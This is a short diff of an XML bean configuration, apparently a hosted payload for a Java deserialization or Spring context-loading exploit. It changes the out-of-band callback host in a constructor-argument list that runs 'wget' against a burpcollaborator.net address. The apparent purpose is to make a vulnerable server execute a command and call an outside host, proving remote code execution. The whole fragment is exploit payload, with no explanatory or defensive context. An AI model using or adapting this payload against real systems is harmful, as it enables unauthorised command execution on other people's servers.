@@ -3,7 +3,7 @@
     <constructor-arg>
       <list>
         <value>wget</value>
-        <value>https://etbsy6oow78ep5zxfm5kn7zxnoteh3.burpcollaborator.net</value>
+        <value>https://6dkkiy8ggzs69xjpzepc7zjp7gd71w.burpcollaborator.net</value>
       </list>
     </constructor-arg>
   </bean>
